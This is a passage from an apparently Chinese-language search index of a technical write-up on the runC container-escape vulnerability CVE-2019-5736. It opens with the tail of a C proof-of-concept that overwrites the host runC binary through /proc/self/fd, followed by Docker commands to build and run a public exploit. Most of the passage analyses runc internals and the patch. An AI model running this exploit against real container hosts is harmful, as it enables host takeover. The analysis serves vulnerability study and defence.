int PATH_MAX_LEN = 30;\nconst int OPEN_ERR = -1;\nconst int RET_ERR = 1;\nconst int RET_OK = 0;\n\nconst long WRITE_TIMEOUT = 99999999999999999;\nBuffer read_new_runc(char * new_runc_path);\n\n\n/*\n* Usage: overwrite_runc </proc/runc_pid/exe> <new runc path>\n* Overwrites the runC binary.\n*/\nint main(int argc, char *argv[])\n{\n    int runc_fd_read, my_runc_fd, wc;\n    char my_runc_fd_path[PATH_MAX_LEN];\n    char * new_runc_path;                        // path to file to replace runc\n    char * runc_exe_path;\n    Buffer new_runc;\n\n\n    if (argc == 1 || argc > 3)\n    {\n        printf(\"Usage: %s </proc/runc_pid/exe> <new runc path>\\n\", argv[0]);\n        return RET_ERR;\n    }\n\n\n    /* Open /proc/runc_pid/exe for reading */\n    runc_exe_path = argv[1];\n    runc_fd_read = open(runc_exe_path, O_RDONLY);\n    if (runc_fd_read == OPEN_ERR)\n    {\n        printf(\"[!] Couldn't open runC's exe %s\\n\", runc_exe_path);\n        perror(\"[!] Open\");\n        return RET_ERR;\n    }\n    printf(\"[+] Got %s as fd %d in this process\\n\", runc_exe_path, runc_fd_read);\n\n\n\n    /* Read new_runc */\n    if (argc < 3)\n        new_runc_path = DEFAULT_NEW_RUNC_PATH;\n    else\n        new_runc_path = argv[2];\n    new_runc = read_new_runc(new_runc_path);\n    if (new_runc.buff == NULL)\n    {\n        close(runc_fd_read);\n        return RET_ERR;\n    }\n    printf(\"[+] Read %d bytes from new runC\\n\", new_runc.len);\n\n\n    /* Try to open /proc/self/fd/runc_fd_read for writing */\n    /* Will Succeed after the runC process exits          */\n    sprintf(my_runc_fd_path, \"/proc/self/fd/%d\", runc_fd_read);\n    int opened = FALSE;\n    for (long count = 0; (!opened && count < WRITE_TIMEOUT); count++)\n    {\n        my_runc_fd = open(my_runc_fd_path, O_WRONLY | O_TRUNC);\n        if (my_runc_fd != OPEN_ERR)\n        {\n            wc = write(my_runc_fd, new_runc.buff, new_runc.len);\n            if (wc !=  new_runc.len)\n            {\n                printf(\"[!] Couldn't write to my process's runC's fd %s\\n\", my_runc_fd_path);\n                close(my_runc_fd);\n                close(runc_fd_read);\n                free(new_runc.buff);\n                return RET_ERR;\n            }\n            printf(\"[+] Opened runC (using %s) for writing\\n\", my_runc_fd_path);\n            printf(\"[+] Succesfully overwritten runC\\n\");\n            opened = TRUE;\n        }\n    }\n\n    /* Clean ups & return */\n    close(my_runc_fd);\n    close(runc_fd_read);\n    free(new_runc.buff);\n    if (opened == FALSE)\n    {\n        printf(\"[!] Reached timeout, couldn't write to runc at %s\\n\", my_runc_fd_path);\n        return RET_ERR;\n    }\n    else\n        printf(\"[+] Done, shuting down ...\\n\");\n\n    fflush(stdout);\n    return RET_OK;\n}\n\n\n/*\n* Reads from the file at new_runc_path, returns a Buffer with new_runc's content.\n*/\nBuffer read_new_runc(char * new_runc_path)\n{\n    Buffer new_runc = {0, NULL};\n    FILE *fp_new_runc;\n    int file_size, rc;\n    void * new_runc_content;\n    char ch;\n\n\n    // open new_Runc\n    fp_new_runc = fopen(new_runc_path, \"r\"); // read mode\n    if (fp_new_runc == NULL)\n    {\n      printf(\"[!] open file err while opening the new runc file %s\\n\", new_runc_path);\n      return new_runc;\n    }\n\n\n    // Get file size and prepare buff\n    fseek(fp_new_runc, 0L, SEEK_END);\n    file_size = ftell(fp_new_runc);\n    new_runc_content = malloc(file_size);\n    rewind(fp_new_runc);\n\n\n    rc = fread(new_runc_content, 1, file_size, fp_new_runc);\n    if (rc != file_size)\n    {\n        printf(\"[!] Couldn't read from new runc file at %s\\n\", new_runc_path);\n        free(new_runc_content);\n        return new_runc;\n    }\n\n\n    fclose(fp_new_runc);\n    new_runc.len = rc;\n    new_runc.buff = new_runc_content;\n    return new_runc;\n\n\n}  \u4f7f\u7528\uff1a  $ git clone https://github.com/twistlock/RunC-CVE-2019-5736\n\n$ docker build -t cve-2019-5736:exec_POC ./RunC-CVE-2019-5736/exec_POC\n$ docker run -d --rm --name poc_ctr cve-2019-5736:exec_POC\n$ docker exec poc_ctr bash  \u5b9e\u9645\u6d4b\u8bd5\uff1a  # docker run --rm --name poc_ctr cve-2019-5736:exec_POC\n[+] Waiting for runC to be executed in the container...\n[!] Open: No such file or directory\n[!] Couldn't open runC's exe /proc/2851/exe",
            "title": "\u5176\u4ed6Poc"
        },
        {
            "location": "/userspace/cve-2019-5736-\u9644\u4ef6/#runc",
            "text": "",
            "title": "runc\u539f\u7406\u5206\u6790"
        },
        {
            "location": "/userspace/cve-2019-5736-\u9644\u4ef6/#runc-run",
            "text": "runc\u521b\u5efa\u548c\u8fd0\u884c\u5bb9\u5668\u7684\u547d\u4ee4\u662f\uff1arunc run\uff0c\u5b83\u4ee3\u7801\u6d41\u7a0b\u76f8\u5f53\u4e8e\u4f9d\u6b21\u6267\u884crunc create\u548crunc start\u547d\u4ee4\u3002    \u9996\u5148\u6839\u636e\u914d\u7f6e\u6587\u4ef6config.json\u521b\u5efa\u5bb9\u5668\u5bf9\u8c61linuxContainer\uff0c\u5176\u4e2d\u5305\u542b\u4e86namespace\u3001cgroups\u3001device\u548cmountpoint\u7b49\u5404\u79cd\u914d\u7f6e\u4fe1\u606f;    \u7136\u540e\u901a\u8fc7\u521b\u5efa\u5b50\u8fdb\u7a0b\u7684\u65b9\u5f0f\u6267\u884c runc init\uff0crunc init\u8fdb\u884c\u4e00\u7cfb\u5217\u521d\u59cb\u5316\u540e( \u6bd4\u5982\u521b\u5efa\u5bb9\u5668\u6587\u4ef6\u7cfb\u7edf\uff0c\u52a0\u5165\u548c\u914d\u7f6e\u547d\u540d\u7a7a\u95f4)\uff0c\u8c03\u7528 execve syscall \u5c06\u81ea\u5df1\u53d8\u6210\u9700\u8981\u6267\u884c\u7684\u5bb9\u5668\u8fdb\u7a0b;    \u5728\u6b64\u4e4b\u524d\uff0c\u4f1a\u5148\u901a\u8fc7\u5199\u5165\u547d\u540d\u7ba1\u9053exec.fifo\u963b\u585e\uff0c\u7b49\u5f85\u76f4\u81f3runc start\u547d\u4ee4\u6267\u884c\uff0c\u8bfb\u53d6exec.fifo\u7684\u5185\u5bb9\u3002",
            "title": "runc run"
        },
        {
            "location": "/userspace/cve-2019-5736-\u9644\u4ef6/#_4",
            "text": "\u5bb9\u5668\u521b\u5efa\u4e3b\u8981\u5de5\u4f5c\u662f\u5c06OCI\u683c\u5f0f\u7684\u914d\u7f6e\u6587\u4ef6config.json\u52a0\u8f7d\u5230\u5185\u5b58linuxContainer\u7ed3\u6784\u4f53\u4e2d  type linuxContainer struct {\n    id                   string\n    root                 string\n    config               *configs.Config\n    cgroupManager        cgroups.Manager\n    intelRdtManager      intelrdt.Manager\n    initPath             string\n    initArgs             []string\n    initProcess          parentProcess\n    initProcessStartTime uint64\n    criuPath             string\n    newuidmapPath        string\n    newgidmapPath        string\n    m                    sync.Mutex\n    criuVersion          int\n    state                containerState\n    created              time.Time\n}  \u7ed3\u6784\u4f53initProcess\u4fdd\u5b58\u4e86\u521b\u5efa\u5bb9\u5668\u521d\u59cb\u5316\u8fdb\u7a0b(runc init)\u7684\u76f8\u5173\u4fe1\u606f:  type initProcess struct {\n    cmd             *exec.Cmd\n    messageSockPair filePair\n    logFilePair     filePair\n    config          *initConfig\n    manager         cgroups.Manager\n    intelRdtManager intelrdt.Manager\n    container       *linuxContainer\n    fds             []string\n    process         *Process\n    bootstrapData   io.Reader\n    sharePidns      bool\n}  \u521b\u5efa\u5bb9\u5668\u65f6\uff0c\u8bbe\u7f6e\u4e86\u5b50\u8fdb\u7a0b\u7684path\u548c\u53c2\u6570\uff1a /proc/self/exe init  \u5373  runc init     // runc/libcontainer/factory_linux.go -> New()\n\nfunc New(root string, options ...func(*LinuxFactory) error) (Factory, error) {\n    // ...\n    l := &LinuxFactory{\n        Root:      root,\n        InitPath:  \"/proc/self/exe\",\n        InitArgs:  []string{os.Args[0], \"init\"},\n        Validator: validate.New(),\n        CriuPath:  \"criu\",\n    }\n    // ...\n    return l, nil\n}  // runc/libcontainer/process_linux.go -> start()\n\nfunc (p *initProcess) start() (retErr error) {\n  ...\n  err := p.cmd.Start()\n  ...\n\n  // Wait for our first child to exit\n  if err := p.waitForChildExit(childPid); err != nil {\n\n  // ...\n  p.sendConfig()\n\n  // ...\n  parseSync(p.messageSockPair.parent, func(sync *syncT) error {\n    switch sync.Type {\n        case procReady:\n        // ...\n        writeSync(p.messageSockPair.parent, procRun)\n    case procHooks:\n        writeSync(p.messageSockPair.parent, procResume)\n\n}  p.cmd.Start()\u662f\u4f7f\u7528\u7684go\u7684package exec\uff0c\u542f\u52a8\u4e00\u4e2a\u5b50\u8fdb\u7a0b\u6267\u884c\u7cfb\u7edf\u547d\u4ee4\u3002    \u6267\u884c\u5b50\u8fdb\u7a0b\u9700\u8981\u7684\u547d\u4ee4\u884c\u914d\u7f6e\u5728commandTemplate\u4e2d\u8bbe\u7f6e  // runc/libcontainer/container_linux.go -> commandTemplate()\n\nfunc (c *linuxContainer) commandTemplate(p *Process, childInitPipe *os.File, childLogPipe *os.File) *exec.Cmd {\n    cmd := exec.Command(c.initPath, c.initArgs[1:]...)\n    cmd.Args[0] = c.initArgs[0]\n    cmd.Stdin = p.Stdin\n    cmd.Stdout = p.Stdout\n    cmd.Stderr = p.Stderr\n    cmd.Dir = c.config.Rootfs\n\n    if cmd.SysProcAttr == nil {\n        cmd.SysProcAttr = &syscall.SysProcAttr{}\n    }\n\n  cmd.Env = append(cmd.Env, fmt.Sprintf(\"GOMAXPROCS=%s\", os.Getenv(\"GOMAXPROCS\")))\n    cmd.ExtraFiles = append(cmd.ExtraFiles, p.ExtraFiles...)\n    if p.ConsoleSocket != nil {\n        cmd.ExtraFiles = append(cmd.ExtraFiles, p.ConsoleSocket)\n        cmd.Env = append(cmd.Env,\n            fmt.Sprintf(\"_LIBCONTAINER_CONSOLE=%d\", stdioFdCount+len(cmd.ExtraFiles)-1),\n        )\n    }\n    cmd.ExtraFiles = append(cmd.ExtraFiles, childInitPipe)\n    cmd.Env = append(cmd.Env\n        fmt.Sprintf(\"_LIBCONTAINER_INITPIPE=%d\", stdioFdCount+len(cmd.ExtraFiles)-1),\n        fmt.Sprintf(\"_LIBCONTAINER_STATEDIR=%s\", c.root),\n    )\n\n\n    cmd.ExtraFiles = append(cmd.ExtraFiles, childLogPipe)\n    cmd.Env = append(cmd.Env,\n        fmt.Sprintf(\"_LIBCONTAINER_LOGPIPE=%d\", stdioFdCount+len(cmd.ExtraFiles)-1),\n        fmt.Sprintf(\"_LIBCONTAINER_LOGLEVEL=%s\", p.LogLevel),\n    )\n  // ...\n\n\n  return c\n}",
            "title": "\u5bb9\u5668\u521b\u5efa"
        },
        {
            "location": "/userspace/cve-2019-5736-\u9644\u4ef6/#_5",
            "text": "\u5bb9\u5668\u521d\u59cb\u5316\u901a\u8fc7 runc init \u5b8c\u6210\uff0c\u53ef\u4ee5\u8bf4\u5bb9\u5668\u8fdb\u7a0b\u533a\u522b\u4e8e\u6b63\u5e38\u7cfb\u7edf\u8fdb\u7a0b\u7684\u6838\u5fc3\u8981\u7d20\u90fd\u662f\u901a\u8fc7 runc init \u6765\u5b9e\u73b0\u3002 \n\u5b83\u9996\u5148\u5bf9\u5f53\u524d\u8fdb\u7a0b\u5b8c\u6210\u5bb9\u5668\u8fdb\u7a0b\u9700\u8981\u7684\u5404\u79cd\u9650\u5236\u548c\u9694\u79bb\uff0c\u7136\u540e\u901a\u8fc7\u7cfb\u7edf\u8c03\u7528execve\u5c06\u81ea\u5df1\u53d8\u6210\u9700\u8981\u6267\u884c\u7684\u8fdb\u7a0b\u3002  // runc/init.go\n\npackage main\n\n\nimport (\n    // ...\n    _ \"github.com/opencontainers/runc/libcontainer/nsenter\"\n    // ...\n)\n\n// ...\nvar initCommand = cli.Command{\n    Name:  \"init\",\n    Usage: `initialize the namespaces and launch the process (do not call it outside of runc)`,\n  // ...\n    Action: func(context *cli.Context) error {\n        factory, _ := libcontainer.New(\"\")\n        if err := factory.StartInitialization(); err != nil {\n        // ...\n    },\n}  // runc/libcontainer/ nsenter/nsexec.c -> nsexec()\n\nvoid nsexec(void)\n{\n  // ...\n  case JUMP_CHILD:{\n    //...\n    if (config.namespaces)\n     join_namespaces(config.namespaces);\n\n    if (config.cloneflags & CLONE_NEWUSER) {\n     if (unshare(CLONE_NEWUSER) < 0)\n      bail(\"failed to unshare user namespace\");\n     config.cloneflags &= ~CLONE_NEWUSER;\n\n    if (unshare(config.cloneflags & ~CLONE_NEWCGROUP) < 0)\n      bail(\"failed to unshare namespaces\");\n    // ...\n    }\n}  \u5bb9\u5668\u521d\u59cb\u5316\u5de5\u4f5c\u5728\u8fd9\u91cc\u5b8c\u6210\uff0c\u6700\u540e\u963b\u585e\u5728write exec.fifo\uff0c\u7b49\u5f85\u5bb9\u5668\u542f\u52a8  // runc/libcontainer/standard_init_linux.go ->  Init()\n\nfunc (l *linuxStandardInit) Init() error {   \n  ... \n  setupNetwork(l.config)\n  ...\n  setupRoute(l.config.Config)\n  ...\n  prepareRootfs(l.pipe, l.config)\n  ...\n  finalizeRootfs(l.config.Config)\n  ...\n  syncParentReady(l.pipe)\n  ... \n  seccomp.InitSeccomp(l.config.Config.Seccomp)\n  ...\n  finalizeNamespace(l.config)\n  ...\n  name, err := exec.LookPath(l.config.Args[0])\n  ...\n  fd, err := unix.Open(fmt.Sprintf(\"/proc/self/fd/%d\", l.fifoFd), unix.O_WRONLY|unix.O_CLOEXEC, 0)\n  ...\n  if _, err := unix.Write(fd, []byte(\"0\")); err != nil {\n  ...\n  syscall.Exec(name, l.config.Args[0:], os.Environ())\n  ...\n}  init.go\u5bfc\u5165\u7684package nsenter\u662f\u505a\u4ec0\u4e48\u7684\uff1f  $ cat README.md\nThe `nsenter` package registers a special init constructor that is called before the Go runtime has a chance to boot.  \n\nThis provides us the ability to `setns` on existing namespaces \nand avoid the issues that the Go runtime has with multiple \nthreads.  \n\nThis constructor will be called if this package is registered, \nimported, in your go application.   \u5bf9\u4e8eMount Namespace\u6765\u8bf4\uff0c\u4e00\u4e2a\u5177\u6709\u591a\u7ebf\u7a0b\u7684\u8fdb\u7a0b\u662f\u65e0\u6cd5\u4f7f\u7528setns\u8c03\u7528\u8fdb\u5165\u5230\u5bf9\u5e94\u7684\u547d\u540d\u7a7a\u95f4( the Go runtime has with multiple threads )\u3002  \u6240\u4ee5\u901a\u8fc7CGO(CGO\u4ecb\u7ecd\u89c1\u4e0b\u6587)\u5728Go runtime \u542f\u52a8\u4e4b\u524d\uff0c\u6267\u884c\u4e00\u4e2a\u6784\u9020\u51fd\u6570\u4e5f\u5c31\u662fnsexec.c\u4e2d\u7684nsexec\u51fd\u6570\u6765\u8fdb\u884csetns\u64cd\u4f5c\u3002  \u8fd9\u4e2a\u6784\u9020\u51fd\u6570\u4f1a\u5728nsenter package \u88ab\u5bfc\u5165\u7684\u65f6\u5019\u6267\u884c\u3002   package nsenter\u7684\u4e3b\u8981\u5185\u5bb9  $ pwd\n.../runc-master/libcontainer/nsenter\n$ tree\n.\n\u251c\u2500\u2500 README.md\n\u251c\u2500\u2500 cloned_binary.c\n\u251c\u2500\u2500 namespace.h\n\u251c\u2500\u2500 nsenter.go\n\u251c\u2500\u2500 nsenter_gccgo.go\n\u251c\u2500\u2500 nsenter_test.go\n\u251c\u2500\u2500 nsenter_unsupported.go\n\u2514\u2500\u2500 nsexec.c\n\n0 directories, 8 files  $ cat nsenter.go\n// +build linux,!gccgo\n\npackage nsenter\n\n/*\n#cgo CFLAGS: -Wall\nextern void nsexec();\nvoid __attribute__((constructor)) init(void) {\n    nsexec();\n}\n*/\nimport \"C\"  \u8fd9\u91cc\u7528\u5230\u4e86CGO\uff1a  $ cat README.md\n...\nThe `nsenter` package will `import \"C\"` and it uses [cgo](https://golang.org/cmd/cgo/) package. \n\nIn cgo, if the import of \"C\" is immediately preceded by a comment, that comment, called the preamble, is used as a header when compiling the C parts of the package.\n...  CGO\u7b80\u5355\u8bf4\u5c31\u662f: \u901a\u8fc7go\u8c03\u7528C\u8bed\u8a00\u4ee3\u7801\uff0c\u8bed\u6cd5\u662f import \"C\"\u8bed\u53e5+\u524d\u9762\u7684\u6ce8\u91ca(\u79f0\u4e3apreamble)\uff0cpreamble\u90e8\u5206\u5c31\u662fC\u8bed\u8a00\u4ee3\u7801(\u5f53C\u4ee3\u7801\u5728\u4e0d\u540c\u6587\u4ef6\u65f6\uff0cpreamble\u53ef\u4ee5\u53ea\u5199\u5934\u6587\u4ef6\u5f15\u7528)\u3002\n\u5177\u4f53\u53c2\u8003\uff1a https://golang.org/cmd/cgo/  https://bastengao.com/blog/2017/12/go-cgo-c.html  \u4e0a\u9762\u7684\u4ee3\u7801\u5dee\u4e0d\u591a\u662f\u8fd9\u6837\u7684\u6548\u679c\uff1a  $ tree\n.\n\u251c\u2500\u2500 cgo_c.c\n\u2514\u2500\u2500 cgo_example.go\n\n0 directories, 2 files\n\n$ cat cgo_c.c\n#include <stdio.h>\n\nvoid c_func1(){\n    printf(\"Hello, CGO!\\n\");\n}\n\nvoid c_func2(){\n    printf(\"Goodbye, CGO!\\n\");\n}\n\n$ cat cgo_example.go\npackage main\n\n/*\nextern void c_func1();\nextern void c_func2();\n\nvoid __attribute__((constructor)) init(void) {\n    c_func1();\n}\n\n*/\nimport \"C\"\n\nfunc main(){\n    C.c_func2()\n}\n\n$ go build -o cgo\n$ ./cgo\nHello, CGO!\nGoodbye, CGO!  \u5173\u4e8e __attribute__((constructor)) : \u5b83\u662f\u4e00\u4e2a\u9762\u5411gcc\u7684\u7279\u6027\uff0c\u529f\u80fd\u662f\u8bbe\u7f6e\u4e00\u4e2a\u5728main\u51fd\u6570\u6267\u884c\u524d\u6267\u884c\u7684\u6784\u9020\u51fd\u6570\u3002",
            "title": "\u5bb9\u5668\u521d\u59cb\u5316"
        },
        {
            "location": "/userspace/cve-2019-5736-\u9644\u4ef6/#_6",
            "text": "\u4e3b\u8981\u505a\u7684\u5c31\u662f\u8bfb\u53d6exec.fifo\u6570\u636e\uff0c\u8ba9 runc init \u7ee7\u7eed\u6267\u884c  // runc/libcontainer/container_linux.go -> exec()\n\nfunc (c *linuxContainer) exec() error {\n    path := filepath.Join(c.root, execFifoFilename)\n    pid := c.initProcess.pid()\n    blockingFifoOpenCh := awaitFifoOpen(path)\n    // ... \n    return handleFifoResult(result)\n    // ...\n}  // runc/libcontainer/container_linux.go  -> handleFifoResult()\n\nfunc handleFifoResult(result openResult) error {\n   // ...\n   f := result.file\n   readFromExecFifo(f)\n   // ...\n   return os.Remove(f.Name())\n}",
            "title": "\u5bb9\u5668\u542f\u52a8"
        },
        {
            "location": "/userspace/cve-2019-5736-\u9644\u4ef6/#runc-exec",
            "text": "runc\u6267\u884c\u4e00\u4e2a\u5bb9\u5668\u8fdb\u7a0b\u7684\u547d\u4ee4\u662f:  runc exec \uff0c\u5b83\u548c runc run \u7684\u6d41\u7a0b\u76f8\u4f3c\uff0c\u4f46\u4e0d\u4f1a\u521b\u5efa\u65b0\u5bb9\u5668\uff0c\u800c\u662f\u901a\u8fc7id\u83b7\u53d6\u5df2\u7ecf\u521b\u5efa\u7684\u5bb9\u5668\uff0c\u4e4b\u540e\u4e5f\u4f1a\u901a\u8fc7\u521b\u5efa runc init \u8fdb\u7a0b\u5bf9\u5bb9\u5668\u8fdb\u7a0b\u521d\u59cb\u5316\uff0c\u7136\u540e\u901a\u8fc7 syscall execve \u5c06\u81ea\u5df1\u66ff\u6362\u6210\u8981\u6267\u884c\u7684\u5bb9\u5668\u8fdb\u7a0b\u3002",
            "title": "runc exec"
        },
        {
            "location": "/userspace/cve-2019-5736-\u9644\u4ef6/#_7",
            "text": "",
            "title": "\u8865\u4e01\u5206\u6790"
        },
        {
            "location": "/userspace/cve-2019-5736-\u9644\u4ef6/#_8",
            "text": "\u7b80\u5355\u603b\u7ed3\u5c31\u662f\uff1a\u901a\u8fc7\u67d0\u79cd\u65b9\u5f0fclone\u4e00\u4e2arunc\u7684 /proc/self/exe \u7684\u53ea\u8bfb\u526f\u672c\uff0c\u8be5\u526f\u672c\u662f\u4e00\u4e2a\u53ea\u8bfb\u7684\u5185\u5b58\u6587\u4ef6\uff0c\u7136\u540e\u91cd\u65b0\u6267\u884cclone\u51fa\u7684\u5185\u5b58\u6587\u4ef6\uff0c\u4ece\u800c\u4f7frunc\u8fdb\u7a0b\u7684proc\u7b26\u53f7\u94fe\u63a5( /proc/self/exe )\u5bf9\u5e94\u7684\u662f\u8be5\u5185\u5b58\u6587\u4ef6\u526f\u672c\u3002  \u4e3a\u4e86\u4fee\u590d\u8fd9\u4e2a\u6f0f\u6d1e\uff0c\u5728runc\u6e90\u7801 libcontainer/nsenter/nsexec.c \u00a0\u6587\u4ef6\u7684 nsexec \u51fd\u6570\u4e2d\u589e\u52a0\u4e86\u4e00\u4e2a ensure_cloned_binary \u51fd\u6570\u8c03\u7528\uff1a  if (ensure_cloned_binary() < 0)\n        bail(\"could not ensure we are a cloned binary\");  \u5b83\u7684\u5b9e\u73b0\u5728\u6587\u4ef6 libcontainer/nsenter/cloned_binary.c \u00a0\u4e2d\uff1a  int ensure_cloned_binary(void)\n{\n   int execfd;\n   ...\n   int cloned = is_self_cloned();\n\n   if (cloned > 0 || cloned == -ENOTRECOVERABLE)\n     return cloned;\n   ...\n   execfd = clone_binary();\n   ...\n   fexecve(execfd, argv, environ);\n   ...\n}   ensure_cloned_binary\u51fd\u6570\u9996\u5148\u901a\u8fc7is_self_cloned\u51fd\u6570\u5224\u65ad\u5f53\u524d\u8fdb\u7a0b\u7684\u53ef\u6267\u884c\u6587\u4ef6\u662f\u5426\u662fcloned(\u8fd9\u91cc\u7684clone\u53ef\u4ee5\u7406\u89e3\u6210\u590d\u5236\u6587\u4ef6\uff0c\u800c\u4e0d\u662fclone\u4e00\u4e2a\u5b50\u8fdb\u7a0b\u7684\u90a3\u4e2aclone)\uff1b  \u5982\u679crunc\u662f\u7b2c\u4e00\u6b21\u88ab\u6267\u884c\uff0c\u5219\u4f1a\u8fd4\u56defalse\uff0c\u7136\u540e\u901a\u8fc7clone_binary\u51fd\u6570\u590d\u5236/proc/self/exe\u6587\u4ef6\uff1b  \u6700\u540e\u901a\u8fc7fexecve\u91cd\u65b0\u542f\u52a8\u5f53\u524d\u8fdb\u7a0b\uff0c\u5bf9\u5e94\u7684\u53ef\u6267\u884c\u6587\u4ef6\u662f\u590d\u5236\u540e\u7684\u6587\u4ef6\uff1b  \u4e0b\u4e00\u6b21\u6267\u884c\u7684\u65f6\u5019\uff0cis_self_cloned\u51fd\u6570\u4f1a\u8fd4\u56detrue\uff0c\u7136\u540e\u8fdb\u5165\u6253\u8865\u4e01\u524d\u7684\u6b63\u5e38\u6d41\u7a0b\u3002",
            "title": "\u8865\u4e01\u6982\u8ff0"
        },
        {
            "location": "/userspace/cve-2019-5736-\u9644\u4ef6/#ensure_cloned_binary-is_self_cloned",
            "text": "is_self_cloned\u662f\u5982\u4f55\u5224\u65ad\u5f53\u524d\u6587\u4ef6\u662f\u5426\u662fclone\u8fc7\u7684\uff1f  #define RUNC_MEMFD_SEALS \\\n    (F_SEAL_SEAL | F_SEAL_SHRINK | F_SEAL_GROW | F_SEAL_WRITE)\n\n\n#ifndef F_SEAL_SEAL\n#  define F_SEAL_SEAL   0x0001  /* prevent further seals from being set */\n#  define F_SEAL_SHRINK 0x0002  /* prevent file from shrinking */\n#  define F_SEAL_GROW   0x0004  /* prevent file from growing */\n#  define F_SEAL_WRITE  0x0008  /* prevent writes */\n#endif\n\n\nstatic int is_self_cloned(void)\n{\n    int fd, ret, is_cloned = 0;\n    struct stat statbuf = {};\n    struct statfs fsbuf = {};\n\n\n    fd = open(\"/proc/self/exe\", O_RDONLY|O_CLOEXEC);\n    if (fd < 0)\n        return -ENOTRECOVERABLE;\n\n\n    /*\n     * Is the binary a fully-sealed memfd? We don't need CLONED_BINARY_ENV for\n     * this, because you cannot write to a sealed memfd no matter what (so\n     * sharing it isn't a bad thing -- and an admin could bind-mount a sealed\n     * memfd to /usr/bin/runc to allow re-use).\n     */\n  // \u901a\u8fc7\u83b7\u53d6\u6587\u4ef6\u7684SEALS\u5224\u65ad\uff0c\u5f53\u524d\u53ef\u6267\u884c\u6587\u4ef6\u662f\u4e0d\u662f\u8bbe\u7f6e\u8fc7SEALS(\u53ea\u8bfb\uff0c\u5927\u5c0f\u4e0d\u53ef\u6539\u53d8)\u7684\u5185\u5b58\u6587\u4ef6\n  // \u5982\u679c\u662f\u901a\u8fc7make_execd\u7684memfd_create\u7684\u65b9\u5f0f\u521b\u5efa\u7684clone\u6587\u4ef6\uff0c\u5219is_clone\u4f1a\u8bbe\u7f6e\u4e3atrue\n    ret = fcntl(fd, F_GET_SEALS);\n    if (ret >= 0) {\n        is_cloned = (ret == RUNC_MEMFD_SEALS);\n        goto out;\n    }\n\n\n    // \u68c0\u67e5\u662f\u5426\u8bbe\u7f6e\u4e86CLONED_BINARY_ENV\n  // \u8fd9\u4e2a\u73af\u5883\u53d8\u91cf\u4f1a\u5728\u7236\u8fdb\u7a0bensure_cloned_binary\u51fd\u6570\u4e2d\u8bbe\u7f6e\n  // \u5982\u679c\u6ca1\u6709\u8bbe\u7f6e\u5219\u5224\u65ad\u4e3a\u7b2c\u4e00\u6b21\u542f\u52a8\uff0c\u5f53\u524d\u53ef\u6267\u884c\u6587\u4ef6\u4e0d\u662fcloned\n    if (!getenv(CLONED_BINARY_ENV)) {\n        is_cloned = false;\n        goto out;\n    }\n\n\n    /*\n     * Is the binary on a read-only filesystem? We can't detect bind-mounts in\n     * particular (in-kernel they are identical to regular mounts) but we can\n     * at least be sure that it's read-only. In addition, to make sure that\n     * it's *our* bind-mount we check CLONED_BINARY_ENV.\n     */\n  // \u5982\u679c\u5f53\u524d\u53ef\u6267\u884c\u6587\u4ef6\u5728\u4e00\u4e2a\u53ea\u8bfb\u7684filesystem\uff0c\u4e5f\u53ef\u4ee5\u5224\u65ad\u662fclone\u7684\u6587\u4ef6\n  // \u901a\u8fc7try_bindfd\u65b9\u5f0f\u521b\u5efa\u7684\u8bdd\uff0cis_cloned\u4f1a\u8bbe\u7f6e\u4e3atrue\n    if (fstatfs(fd, &fsbuf) >= 0)\n        is_cloned |= (fsbuf.f_flags & MS_RDONLY);\n\n\n    /*\n     * Okay, we're a tmpfile -- or we're currently running on RHEL <=7.6\n     * which appears to have a borked backport of F_GET_SEALS. Either way,\n     * having a file which has no hardlinks indicates that we aren't using\n     * a host-side \"runc\" binary and this is something that a container\n     * cannot fake (because unlinking requires being able to resolve the\n     * path that you want to unlink).\n     */\n  // \u5982\u679c\u5f53\u524d\u53ef\u6267\u884c\u6587\u4ef6\u6ca1\u6709hardlinks\u4e5f\u53ef\u4ee5\u5224\u65ad\u662fclone\u7684\u4e34\u65f6\u6587\u4ef6\n    if (fstat(fd, &statbuf) >= 0)\n        is_cloned |= (statbuf.st_nlink == 0);\n\n\nout:\n    close(fd);\n    return is_cloned;\n}",
            "title": "ensure_cloned_binary-&gt;is_self_cloned"
        },
        {
            "location": "/userspace/cve-2019-5736-\u9644\u4ef6/#ensure_cloned_binary-clone_binary",
            "text": "clone_binary\u662f\u5982\u4f55\u5b9e\u73b0\u7684\uff1f    \u521b\u5efa\u4e00\u4e2a\u53ea\u8bfb\u7684\uff0c\u5927\u5c0f\u4e0d\u53ef\u6539\u53d8\u7684\u4e34\u65f6\u5185\u5b58\u6587\u4ef6\uff0c\u4f5c\u4e3arunc\u53ef\u6267\u884c\u6587\u4ef6\u7684clone\u3002  \u7b2c\u4e00\u79cd\u65b9\u5f0f\u662f\u901a\u8fc7bind mount\uff0c\u89c1try_bindfd\u90e8\u5206  static int clone_binary(void)\n{\n\u00a0 \u00a0 ...\n    /*\n     * Before we resort to copying, let's try creating an ro-binfd in one shot\n     * by getting a handle for a read-only bind-mount of the execfd.\n     */\n\u00a0\u00a0\n    execfd = try_bindfd();\n    if (execfd >= 0)\n        return execfd;\n    ...  \u7b2c\u4e8c\u79cd\u65b9\u5f0f: \u5f53try_bindfd\u5931\u8d25\u7684\u65f6\u5019\u901a\u8fc7make_execfd\u548cseal_execfd\u6765\u5b9e\u73b0clone\u65b9\u6848\u3002  \u901a\u8fc7 make_exec \u6765\u521b\u5efa\u4e00\u4e2a\u5185\u5b58\u6587\u4ef6\uff0c\u62f7\u8d1d /proc/self/exe \u7684\u6570\u636e\u540e\uff0c\u901a\u8fc7 seal_execfd \u5bf9\u8be5\u5185\u5b58\u6587\u4ef6\u8bbe\u7f6e\u9650\u5236\u4f7f\u5176\u53ea\u8bfb\u3002\u6548\u679c\u5c31\u662f\u521b\u5efa\u4e86\u4e00\u4e2a\u53ea\u5b58\u5728\u4e8e\u5185\u5b58\u4e2d\u7684 /proc/self/exe \u7684\u53ea\u8bfb\u7684clone\u6587\u4ef6\u3002      /*\n     * Dammit, that didn't work -- time to copy the binary to a safe place we\n     * can seal the contents.\n     */\n    execfd = make_execfd(&fdtype);\n    ...\n    binfd = open(\"/proc/self/exe\", O_RDONLY | O_CLOEXEC);\n    ...\n    fstat(binfd, &statbuf) \n    ...\n    while (sent < statbuf.st_size) {\n        int n = sendfile(execfd, binfd, NULL, statbuf.st_size - sent);\n        ...\n        sent += n;\n    }\n    close(binfd);\n    ...\n    seal_execfd(&execfd, fdtype)\n    ...\n    return execfd;\n    ...",
            "title": "ensure_cloned_binary-&gt;clone_binary"
        },
        {
            "location": "/userspace/cve-2019-5736-\u9644\u4ef6/#clone_binary-try_bindfd",
